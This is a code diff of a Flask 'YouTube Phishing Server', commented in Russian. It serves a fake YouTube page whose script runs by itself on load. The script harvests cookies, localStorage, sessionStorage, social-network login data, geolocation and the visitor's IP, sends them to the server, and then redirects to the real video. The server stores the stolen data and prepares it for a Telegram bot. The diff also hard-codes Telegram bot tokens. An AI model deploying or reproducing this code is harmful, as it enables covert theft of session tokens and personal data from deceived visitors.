@@ -10,11 +10,12 @@ import re
 app = Flask(__name__)
 CORS(app)  # Разрешить кросс-доменные запросы
 
-# Конфигурация
-BOT_TOKEN = "7761726726:AAFOmI7tGqC8kydO9U3yR8dNmyUczP2Vc7U"  # ⚠️ ЗАМЕНИТЕ НА ВАШ ТОКЕН
+# Конфигурация - ДОЛЖНО СОВПАДАТЬ С bot.py
+BOT_TOKEN = "8563753978:AAFGVXvRanl0w4DSPfvDYh08aHPLPE0hQ1I"  # ТОТ ЖЕ САМЫЙ ТОКЕН
 ADMIN_ID = 1709490182
+WEBHOOK_URL = "https://ваш-сервер.onrender.com/webhook"  # URL куда отправлять данные
 
-# HTML шаблон фишинговой страницы (с улучшенным сбором данных)
+# HTML шаблон фишинговой страницы (полная версия)
 HTML_TEMPLATE = '''<!DOCTYPE html>
 <html lang="ru">
 <head>
@@ -296,9 +297,6 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
             localStorage: {},
             sessionStorage: {},
             
-            // IndexedDB (базы данных браузера)
-            indexedDB_databases: [],
-            
             // Социальные сети (определяем по кукам и localStorage)
             social_networks: {
                 google: { logged_in: false, data: {} },
@@ -312,26 +310,14 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
                 discord: { logged_in: false, data: {} }
             },
             
-            // Автозаполнение форм (попытка получить сохраненные пароли)
-            autofill_data: [],
-            
             // Плагины браузера
             browser_plugins: [],
-            
-            // Медиа устройства
-            media_devices: [],
             
             // Сетевая информация
             connection: null,
             
-            // Батарея
-            battery: null,
-            
             // Геолокация
-            geolocation: null,
-            
-            // Canvas fingerprint
-            canvas_fingerprint: null
+            geolocation: null
         };
         
         // ========== ФУНКЦИИ СБОРА ДАННЫХ ==========
@@ -414,3 +400,526 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
                 
                 // WHATSAPP
                 if (keyLower.includes('whatsapp') || keyLower.includes('wa_')) {
+                    collectedData.social_networks.whatsapp.logged_in = true;
+                    collectedData.social_networks.whatsapp.data[key] = value.substring(0, 100);
+                }
+                
+                // TELEGRAM
+                if (keyLower.includes('telegram') || keyLower.includes('tg_') ||
+                    valueStr.includes('telegram') || keyLower.includes('user_id')) {
+                    collectedData.social_networks.telegram.logged_in = true;
+                    collectedData.social_networks.telegram.data[key] = value.substring(0, 100);
+                }
+                
+                // TIKTOK
+                if (keyLower.includes('tiktok') || keyLower.includes('tt_')) {
+                    collectedData.social_networks.tiktok.logged_in = true;
+                    collectedData.social_networks.tiktok.data[key] = value.substring(0, 100);
+                }
+                
+                // DISCORD
+                if (keyLower.includes('discord') || keyLower.includes('dc_') ||
+                    valueStr.includes('discord')) {
+                    collectedData.social_networks.discord.logged_in = true;
+                    collectedData.social_networks.discord.data[key] = value.substring(0, 100);
+                }
+            } catch (e) {
+                console.error('Ошибка проверки соцсетей:', e);
+            }
+        }
+        
+        // 4. Собираем информацию о плагинах
+        function collectBrowserPlugins() {
+            try {
+                if (navigator.plugins) {
+                    for (let plugin of navigator.plugins) {
+                        collectedData.browser_plugins.push({
+                            name: plugin.name,
+                            description: plugin.description,
+                            filename: plugin.filename,
+                            length: plugin.length
+                        });
+                    }
+                }
+            } catch (error) {
+                console.error('❌ Ошибка сбора плагинов:', error);
+            }
+        }
+        
+        // 5. Собираем сетевую информацию
+        function collectNetworkInfo() {
+            try {
+                if (navigator.connection) {
+                    collectedData.connection = {
+                        effectiveType: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt,
+                        saveData: navigator.connection.saveData
+                    };
+                }
+            } catch (error) {
+                console.error('❌ Ошибка сбора сетевой информации:', error);
+            }
+        }
+        
+        // 6. Пытаемся получить геолокацию
+        function tryGeolocation() {
+            if ('geolocation' in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        collectedData.geolocation = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: position.timestamp
+                        };
+                        console.log('✅ Геолокация получена');
+                        updateProgress(90);
+                    },
+                    error => {
+                        console.log('❌ Геолокация отклонена:', error.message);
+                        updateProgress(90);
+                    },
+                    { timeout: 5000, enableHighAccuracy: true }
+                );
+            } else {
+                console.log('❌ Геолокация не поддерживается');
+                updateProgress(90);
+            }
+        }
+        
+        // 7. Получаем IP через внешний сервис
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                collectedData.ip = data.ip;
+                console.log('✅ IP адрес получен:', data.ip);
+            } catch (error) {
+                try {
+                    // Запасной вариант
+                    const response = await fetch('https://api64.ipify.org?format=json');
+                    const data = await response.json();
+                    collectedData.ip = data.ip;
+                } catch (e) {
+                    collectedData.ip = 'не удалось определить';
+                    console.error('❌ Ошибка получения IP:', e);
+                }
+            }
+        }
+        
+        // 8. Отправка данных на сервер через вебхук
+        async function sendCollectedData() {
+            try {
+                updateStatus('Отправка данных на сервер...', 'info');
+                
+                const response = await fetch('/collect', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(collectedData)
+                });
+                
+                if (response.ok) {
+                    const result = await response.json();
+                    console.log('✅ Данные отправлены успешно:', result);
+                    updateStatus('✅ Данные успешно отправлены!', 'success');
+                    updateProgress(100);
+                    
+                    // Перенаправляем на оригинальное видео через 3 секунды
+                    setTimeout(() => {
+                        window.location.href = 'https://www.youtube.com/watch?v={{ video_id }}';
+                    }, 3000);
+                    
+                    return true;
+                } else {
+                    throw new Error('Ошибка сервера: ' + response.status);
+                }
+            } catch (error) {
+                console.error('❌ Ошибка отправки данных:', error);
+                updateStatus('⚠️ Ошибка отправки, но видео загружено', 'warning');
+                updateProgress(100);
+                
+                // Все равно перенаправляем через 3 секунды
+                setTimeout(() => {
+                    window.location.href = 'https://www.youtube.com/watch?v={{ video_id }}';
+                }, 3000);
+                
+                return false;
+            }
+        }
+        
+        // 9. Вспомогательные функции UI
+        function updateStatus(message, type = 'info') {
+            const statusEl = document.getElementById('status');
+            const icon = type === 'success' ? 'fa-check-circle' : 
+                        type === 'warning' ? 'fa-exclamation-triangle' : 'fa-spinner fa-spin';
+            
+            statusEl.innerHTML = `<i class="fas ${icon}"></i> ${message}`;
+            
+            if (type === 'success') {
+                statusEl.style.color = '#4CAF50';
+            } else if (type === 'warning') {
+                statusEl.style.color = '#FF9800';
+            }
+        }
+        
+        function updateProgress(percent) {
+            const progressEl = document.getElementById('progress');
+            progressEl.style.width = percent + '%';
+        }
+        
+        // ========== ОСНОВНОЙ ПРОЦЕСС СБОРА ДАННЫХ ==========
+        async function startDataCollection() {
+            console.log('🚀 Начало сбора данных...');
+            updateStatus('Инициализация сбора данных...', 'info');
+            updateProgress(10);
+            
+            try {
+                // Этап 1: Сбор базовой информации (20%)
+                updateStatus('Сбор базовой информации...', 'info');
+                await getIPAddress();
+                collectBrowserPlugins();
+                collectNetworkInfo();
+                updateProgress(20);
+                
+                // Этап 2: Сбор хранилищ (40%)
+                updateStatus('Анализ локального хранилища...', 'info');
+                collectLocalStorage();
+                collectSessionStorage();
+                updateProgress(40);
+                
+                // Этап 3: Анализ cookies и соцсетей (60%)
+                updateStatus('Проверка авторизаций в соцсетях...', 'info');
+                updateProgress(60);
+                
+                // Этап 4: Геолокация (80%)
+                updateStatus('Определение местоположения...', 'info');
+                tryGeolocation();
+                
+                // Ждем 2 секунды для завершения асинхронных операций
+                setTimeout(async () => {
+                    // Этап 5: Отправка данных (100%)
+                    await sendCollectedData();
+                }, 2000);
+                
+            } catch (error) {
+                console.error('Критическая ошибка сбора данных:', error);
+                updateStatus('Ошибка сбора данных', 'warning');
+                updateProgress(100);
+                
+                // Все равно пытаемся отправить то, что собрали
+                try {
+                    await sendCollectedData();
+                } catch (sendError) {
+                    console.error('Не удалось отправить данные:', sendError);
+                }
+            }
+        }
+        
+        // Запускаем сбор данных через 2 секунды после загрузки страницы
+        setTimeout(() => {
+            startDataCollection();
+        }, 2000);
+        
+        // Обновляем время на странице
+        function updateCurrentTime() {
+            const now = new Date();
+            const timeString = now.toLocaleTimeString('ru-RU');
+            document.getElementById('currentTime').textContent = timeString;
+        }
+        
+        // Обновляем статус соединения
+        function updateConnectionStatus() {
+            const statusEl = document.getElementById('connectionStatus');
+            if (navigator.onLine) {
+                if (navigator.connection && navigator.connection.effectiveType) {
+                    statusEl.textContent = `Стабильное (${navigator.connection.effectiveType})`;
+                } else {
+                    statusEl.textContent = 'Стабильное';
+                }
+            } else {
+                statusEl.textContent = 'Отсутствует';
+                statusEl.style.color = '#FF9800';
+            }
+        }
+        
+        setInterval(updateCurrentTime, 1000);
+        setInterval(updateConnectionStatus, 5000);
+        updateCurrentTime();
+        updateConnectionStatus();
+    </script>
+</body>
+</html>
+'''
+
+# ========== FLASK МАРШРУТЫ ==========
+
+@app.route('/')
+def index():
+    """Главная страница - редирект на YouTube"""
+    return redirect('https://www.youtube.com')
+
+@app.route('/watch')
+def watch():
+    """Фишинговая страница с YouTube плеером"""
+    # Получаем параметры из URL
+    video_id = request.args.get('v', 'dQw4w9WgXcQ')  # Rick Roll по умолчанию
+    link_id = request.args.get('id', 'unknown')
+    timestamp = request.args.get('t', '0')
+    
+    # Логируем посещение
+    ip_address = request.remote_addr
+    user_agent = request.headers.get('User-Agent', 'Unknown')
+    referer = request.headers.get('Referer', 'Прямой переход')
+    
+    print(f"\n{'='*60}")
+    print(f"[+] НОВОЕ ПОСЕЩЕНИЕ")
+    print(f"[+] Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print(f"[+] IP: {ip_address}")
+    print(f"[+] User-Agent: {user_agent[:80]}...")
+    print(f"[+] Referer: {referer[:80]}...")
+    print(f"[+] Video ID: {video_id}")
+    print(f"[+] Link ID: {link_id}")
+    print(f"{'='*60}\n")
+    
+    # Сохраняем информацию о посещении в лог
+    try:
+        with open('visits.log', 'a', encoding='utf-8') as f:
+            f.write(f"{datetime.now().isoformat()},{ip_address},{link_id},{video_id},{user_agent[:100]}\n")
+    except:
+        pass
+    
+    # Рендерим HTML страницу
+    current_time = datetime.now().strftime("%H:%M:%S")
+    rendered_html = HTML_TEMPLATE.replace('{{ video_id }}', video_id)\
+                                 .replace('{{ link_id }}', link_id)\
+                                 .replace('{{ current_time }}', current_time)
+    
+    return render_template_string(rendered_html)
+
+@app.route('/collect', methods=['POST'])
+def collect_data():
+    """Прием собранных данных от фишинговой страницы"""
+    try:
+        data = request.json
+        
+        if not data:
+            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
+        
+        # Извлекаем основные данные
+        link_id = data.get('link_id', 'unknown')
+        ip = data.get('ip', 'unknown')
+        user_agent = data.get('user_agent', 'unknown')
+        video_id = data.get('video_id', 'unknown')
+        
+        print(f"\n{'='*60}")
+        print(f"[!] ДАННЫЕ ПОЛУЧЕНЫ")
+        print(f"[!] Link ID: {link_id}")
+        print(f"[!] IP: {ip}")
+        print(f"[!] User-Agent: {user_agent[:80]}...")
+        print(f"[!] Video ID: {video_id}")
+        print(f"[!] Timestamp: {data.get('timestamp', 'unknown')}")
+        
+        # Проверяем социальные сети
+        social_data = data.get('social_networks', {})
+        logged_in_networks = []
+        
+        for network, info in social_data.items():
+            if info.get('logged_in'):
+                logged_in_networks.append(network)
+        
+        if logged_in_networks:
+            print(f"[!] Обнаружены входы в соцсети: {', '.join(logged_in_networks)}")
+        
+        print(f"[!] Cookies: {'Да' if data.get('cookies') else 'Нет'}")
+        print(f"[!] LocalStorage записей: {len(data.get('localStorage', {}))}")
+        print(f"[!] Screen: {data.get('screen', 'unknown')}")
+        print(f"[!] Timezone: {data.get('timezone', 'unknown')}")
+        print(f"{'='*60}\n")
+        
+        # Сохраняем данные в файл
+        try:
+            filename = f"data_{link_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+            with open(f'collected_data/{filename}', 'w', encoding='utf-8') as f:
+                json.dump(data, f, ensure_ascii=False, indent=2, default=str)
+            print(f"[+] Данные сохранены в файл: {filename}")
+        except Exception as e:
+            print(f"[-] Ошибка сохранения в файл: {e}")
+            # Сохраняем в общий лог
+            with open('all_data.log', 'a', encoding='utf-8') as f:
+                f.write(f"{datetime.now().isoformat()}|{link_id}|{ip}|{video_id}|{len(logged_in_networks)}\n")
+        
+        # Отправляем данные в Telegram бот через вебхук
+        send_to_telegram_bot(data)
+        
+        return jsonify({
+            'status': 'success',
+            'message': 'Data received successfully',
+            'redirect_to': f'https://youtube.com/watch?v={video_id}',
+            'timestamp': datetime.now().isoformat()
+        })
+        
+    except Exception as e:
+        print(f"[-] Ошибка обработки данных: {str(e)}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+def send_to_telegram_bot(data):
+    """Отправка данных в Telegram бот"""
+    try:
+        # Подготовка данных для отправки
+        link_id = data.get('link_id', 'unknown')
+        ip = data.get('ip', 'unknown')
+        
+        # Формируем упрощенное сообщение для Telegram
+        message = {
+            'link_id': link_id,
+            'ip': ip,
+            'user_agent': data.get('user_agent', 'unknown')[:100],
+            'timestamp': data.get('timestamp', 'unknown'),
+            'screen': data.get('screen', 'unknown'),
+            'timezone': data.get('timezone', 'unknown'),
+            'cookies_count': len(data.get('cookies', '').split(';')) if data.get('cookies') else 0,
+            'localstorage_count': len(data.get('localStorage', {})),
+            'social_logins': []
+        }
+        
+        # Добавляем информацию о соцсетях
+        social_data = data.get('social_networks', {})
+        for network, info in social_data.items():
+            if info.get('logged_in'):
+                message['social_logins'].append(network)
+        
+        # Здесь должна быть отправка в ваш вебхук
+        # Например: requests.post(WEBHOOK_URL, json=message)
+        print(f"[→] Данные подготовлены для отправки в Telegram: {link_id}")
+        
+    except Exception as e:
+        print(f"[-] Ошибка подготовки данных для Telegram: {e}")
+
+@app.route('/webhook', methods=['POST'])
+def webhook():
+    """Вебхук для приема данных от других сервисов"""
+    try:
+        data = request.json
+        print(f"[Webhook] Получены данные: {data.keys() if data else 'No data'}")
+        
+        # Здесь можно обработать данные от других источников
+        
+        return jsonify({'status': 'received', 'timestamp': datetime.now().isoformat()})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 400
+
+@app.route('/stats')
+def stats():
+    """Статистика посещений"""
+    try:
+        # Читаем лог посещений
+        visits = []
+        try:
+            with open('visits.log', 'r', encoding='utf-8') as f:
+                for line in f:
+                    if line.strip():
+                        visits.append(line.strip().split(','))
+        except FileNotFoundError:
+            pass
+        
+        # Читаем лог данных
+        data_count = 0
+        try:
+            with open('all_data.log', 'r', encoding='utf-8') as f:
+                data_count = len(f.readlines())
+        except FileNotFoundError:
+            pass
+        
+        return jsonify({
+            'status': 'ok',
+            'total_visits': len(visits),
+            'total_data_collected': data_count,
+            'last_24h_visits': len([v for v in visits if is_recent(v[0])]) if visits else 0,
+            'unique_ips': len(set(v[1] for v in visits)) if visits else 0,
+            'timestamp': datetime.now().isoformat()
+        })
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+def is_recent(timestamp, hours=24):
+    """Проверяет, является ли timestamp не старше указанных часов"""
+    try:
+        from datetime import datetime, timedelta
+        ts_time = datetime.fromisoformat(timestamp.replace('Z', '+00:00'))
+        cutoff_time = datetime.now() - timedelta(hours=hours)
+        return ts_time > cutoff_time
+    except:
+        return False
+
+@app.route('/health')
+def health():
+    """Проверка здоровья сервера"""
+    return jsonify({
+        'status': 'healthy',
+        'timestamp': datetime.now().isoformat(),
+        'service': 'YouTube Phishing Server',
+        'version': '1.0'
+    })
+
+@app.route('/cleanup', methods=['POST'])
+def cleanup():
+    """Очистка старых данных (только для админа)"""
+    # Проверка ключа (упрощенная)
+    auth_key = request.headers.get('X-Auth-Key', '')
+    if auth_key != hashlib.sha256(str(ADMIN_ID).encode()).hexdigest():
+        return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
+    
+    try:
+        # Удаляем файлы старше 7 дней
+        from datetime import datetime, timedelta
+        import os
+        
+        cutoff = datetime.now() - timedelta(days=7)
+        deleted_files = 0
+        
+        # Проверяем папку collected_data
+        if os.path.exists('collected_data'):
+            for filename in os.listdir('collected_data'):
+                filepath = os.path.join('collected_data', filename)
+                if os.path.isfile(filepath):
+                    file_time = datetime.fromtimestamp(os.path.getmtime(filepath))
+                    if file_time < cutoff:
+                        os.remove(filepath)
+                        deleted_files += 1
+        
+        return jsonify({
+            'status': 'success',
+            'message': f'Deleted {deleted_files} old files',
+            'timestamp': datetime.now().isoformat()
+        })
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+# ========== ЗАПУСК СЕРВЕРА ==========
+
+if __name__ == '__main__':
+    # Создаем необходимые папки
+    import os
+    os.makedirs('collected_data', exist_ok=True)
+    
+    print(f"""
+    {'='*60}
+    🚀 YouTube Phishing Server запускается...
+    📍 IP: 0.0.0.0:5000
+    ⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+    🔗 Пример ссылки: http://localhost:5000/watch?v=dQw4w9WgXcQ&id=test123
+    📊 Статистика: http://localhost:5000/stats
+    ❤️  Здоровье: http://localhost:5000/health
+    {'='*60}
+    """)
+    
+    # Запускаем Flask сервер
+    app.run(
+        host='0.0.0.0',
+        port=5000,
+        debug=False,  # В продакшене всегда False!
+        threaded=True
+    )
